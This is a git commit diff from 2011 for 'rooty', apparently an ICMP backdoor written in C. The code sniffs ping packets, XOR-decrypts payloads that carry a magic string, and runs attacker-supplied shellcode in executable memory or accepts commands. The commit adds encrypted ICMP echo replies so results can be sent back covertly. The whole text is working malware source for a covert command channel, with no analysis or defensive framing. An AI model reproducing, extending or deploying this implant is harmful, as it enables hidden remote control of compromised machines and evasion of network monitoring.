67ce458582c5ab82db885f69280d5e6adf7b1b6d
Christopher <christopher@dorkfire.com>
2011-03-07 17:05:30 -0500

    Added encrypted icmp response functions

--- rooty.c
+++ rooty.c
@@ -1,19 +1,63 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <pcap.h>
-#include <netdb.h>
-#include <netinet/ip.h>
-#include <netinet/ip_icmp.h>
-#include <sys/mman.h>
 #include "rooty.h"
 
-#define SIZE_ETHERNET 14
-#define DEBUG
-#define STACK_SIZE 512
+int output_socket = 0;
+
+int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
+	struct icmphdr *icmp = NULL;
+	uint8_t *pkt_data = NULL;
+
+	if((pkt != NULL) && (icmp_input != NULL)) {
+
+		icmp = (struct icmphdr *)pkt;
+		pkt_data = (uint8_t *)(pkt + sizeof(struct icmphdr));
+
+		// Required ICMP fields
+		icmp->type = 0;
+		icmp->code = 0;
+		icmp->un.echo.id = icmp_input->un.echo.id;
+		icmp->un.echo.sequence = icmp_input->un.echo.sequence;
+		icmp->checksum = icmp_input->checksum;
+
+		// Copy the data into the packet
+		memcpy(pkt_data, data, size);
+
+		return (sizeof(struct icmphdr) + size);	
+	}
+	
+	return 0;
+}
+
+void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
+	uint32_t pkt_size = sizeof(struct icmphdr) + size;
+	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
+	struct sockaddr_in sin;
+
+	// Make sure we have data
+	if(size > 0) {
+
+		// Generate the key for transmission
+		key = (unsigned char *)&icmp->un.echo.sequence;
+
+		// Encrypt the data
+		if(decrypt_message(data, encrypted_data, size, key) == size) {
+
+			// Clear out the packet
+			memset(pkt, 0, pkt_size);
+
+			// Create our packet
+			if((pkt_size = build_packet(pkt, icmp, encrypted_data, size)) > 0) {
+
+				// Fill in the sockaddr
+				sin.sin_family = AF_INET;
+				sin.sin_port = 0;
+				sin.sin_addr.s_addr = ip->saddr;
+
+				// Not going to worry about failures
+				sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
+			}
+		}
+	}
+}
 
 void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
@@ -34,6 +78,7 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 
 			// Hopefully this works
 			if((pid = fork()) >= 0) {
+
 				if(pid == 0) {
 
 					// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
@@ -53,11 +98,11 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	}
 }
 
-void run_command(const unsigned char *command, uint32_t size, unsigned char *key, const struct iphdr *ip) {
+void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	printf("I would love to run: %s\n", command);
 }
 
-int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint16_t key_info, uint32_t size, unsigned char *key) {
+int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
 	int ctr;
 
 	for(ctr = 0; ctr < size; ctr++) {	
@@ -67,22 +112,35 @@ int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint
 	return ctr;
 }
 
-void process_message(const unsigned char *data, uint16_t key_info, uint32_t size, const struct iphdr *ip) {
+void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	unsigned char decoded_data[size];
-	unsigned char *key = (unsigned char *)&(key_info);
+	unsigned char *key = (unsigned char *)&(icmp->un.echo.sequence);
+	uint32_t data_len = 0, hdr_len = 0;
+	uint8_t msg_type = 0;
+
+	send_packet("ABCD", 4, ip, icmp);
 
 	// Make sure we have data
 	if(size > 0) {
-		if(decrypt_message(data, decoded_data, key_info, size, key) > 0) {
 
-			// First byte should be the message type
-			switch(decoded_data[0]) {
-				case MESSAGE_SHELLCODE:
-					run_shellcode(decoded_data + 1, size - 1);
-					break;
-				case MESSAGE_COMMAND:
-					run_command(decoded_data + 1, size - 1, key, ip);
-					break;
+		// Decrypt the message (I know right?)
+		if(decrypt_message(data, decoded_data, size, key) > 0) {
+
+			// Make sure the magic is there
+			if(!strncmp(decoded_data, MAGIC, strlen(MAGIC))) {
+				hdr_len = strlen(MAGIC) + 1;
+				data_len = size - hdr_len;
+				msg_type = data[hdr_len - 2];
+
+				// First byte should be the message type
+				switch(msg_type) {
+					case MESSAGE_SHELLCODE:
+						run_shellcode(decoded_data + hdr_len, data_len);
+						break;
+					case MESSAGE_COMMAND:
+						run_command(decoded_data + hdr_len, data_len, ip, icmp);
+						break;
+				}
 			}
 		}
 	}
@@ -111,7 +169,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 
 	// Only want to deal with icmp echo requests
 	if((icmp->type == 8) && (icmp->code == 0)) {
-		process_message(data, icmp->checksum, (hdr->len - (data - pkt)), ip);
+		process_message(data, (hdr->len - (data - pkt)), ip, icmp);
 	}
 }
 
@@ -128,6 +186,9 @@ int main(int argc, char *argv[0]) {
 		fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
 		return -1;
 	}
+
+	// Seed random for later
+	srand(time(NULL));
 
 	// Yay, we have an interface
 	iface = argv[1];
@@ -159,6 +220,12 @@ int main(int argc, char *argv[0]) {
 	// Finally set up our filter
 	if(pcap_setfilter(handle, &fp)) {
 		fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
+		return -1;
+	}
+
+	// Create our socket for sending responses
+	if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) <= 0) {
+		fprintf(stderr, "Error creating raw socket\n");
 		return -1;
 	}
 
--- rooty.h
+++ rooty.h
@@ -1,2 +1,39 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <pcap.h>
+#include <netdb.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <sys/mman.h>
+
+#define DEBUG
+#define SIZE_ETHERNET   14
+#define STACK_SIZE      512
+#define MAX_PACKET_SIZE 4096
+#define MAGIC           "GOATSE"
+
 #define MESSAGE_SHELLCODE 	0x01
 #define MESSAGE_COMMAND 	0x02
+
+// Build response packets for sending
+int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size);
+
+// Send response packet
+void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
+
+// Execute shellcode received from shellcode message
+void run_shellcode(const unsigned char *shellcode, uint32_t size);
+
+// Execute system command and send back the results via ICMP echo reply
+void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
+
+// Decrypt/encrypt data using the two byte key (Yay, xor)
+int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key);
+
+// Process the received icmp message
+void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
+
